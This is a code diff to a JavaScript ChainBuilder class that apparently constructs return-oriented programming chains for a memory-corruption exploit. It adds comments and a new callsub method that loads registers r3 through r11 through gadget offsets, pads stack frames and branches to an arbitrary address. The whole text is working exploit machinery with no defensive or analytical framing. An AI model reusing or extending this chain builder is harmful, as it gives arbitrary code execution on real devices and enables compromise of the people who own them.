@@ -82,6 +82,7 @@ class ChainBuilder {
 		
 		r31out = r31out || this.gtemp;
 		
+		// Load parameters
 		this.appendChain(
 			Util.pad(0x10, SF)
 			+ Util.int64(0x0, this.offsets.gadgetMod2)
@@ -115,6 +116,7 @@ class ChainBuilder {
 		
 		this.appendChainParamInt64(r3);
 		
+		// Execute syscall
 		this.appendChain(	
 			//////////
 			
@@ -188,6 +190,71 @@ class ChainBuilder {
 			Util.pad(0x10, SF)
 			+ Util.int64(0x0, this.offsets.gadgetMod13)
 			+ Util.pad(0x68, AA)
+		);
+		
+		return this;
+	}
+	
+	callsub(sub, r3 = 0, r4 = 0, r5 = 0, r6 = 0, r7 = 0, r8 = 0, r9 = 0, r10 = 0, r11 = 0, frameSize, r31in, r31out) {
+		var AA = unescape("\u4141"), SF = unescape("\u5346");
+		
+		var minFrameSize = 0x20;
+		if (frameSize < minFrameSize) {
+			throw new Error("ChainBuilder.callsub(): frame size is too small");	
+		}
+		
+		r31in = r31in || this.gtemp;
+		r31out = r31out || this.gtemp;
+		
+		// Load parameters
+		this.appendChain(
+			Util.pad(0x10, SF)
+			+ Util.int64(0x0, this.offsets.gadgetMod2)
+			+ Util.pad(0x60, AA)
+			+ Util.int64(0x0, this.gtemp)
+			
+			//////////
+			
+			+ Util.pad(0x10, SF)
+			+ Util.int64(0x0, this.offsets.gadgetMod1)
+			+ Util.pad(0x5C, AA)
+		);
+		
+		this.appendChainParamInt32(r11);
+		this.appendChainParamInt32(r10);
+		this.appendChainParamInt32(r8);
+		this.appendChainParamInt32(r7);
+		this.appendChainParamInt32(r6);
+		this.appendChainParamInt32(r5);
+		this.appendChainParamInt32(r4);
+		
+		this.appendChain(
+			Util.pad(0x4, AA)
+		);
+		
+		this.appendChainParamInt32(r9);
+		
+		this.appendChain(
+			Util.pad(0x20, AA)
+		);
+		
+		this.appendChainParamInt64(r3);
+		
+		// blr to address
+		this.appendChain(	
+			//////////
+			
+			Util.pad(0x10, SF)
+			+ Util.int64(0x0, this.offsets.gadgetMod2)
+			+ Util.pad(0x60, AA)
+			+ Util.int64(0x0, this.gtemp)
+			
+			//////////
+			
+			+ Util.pad(0x10, SF)
+			+ Util.int64(0x0, sub)
+			+ Util.pad(frameSize - minFrameSize, AA)
+			+ Util.int64(0x0, r31out)
 		);
 		
 		return this;
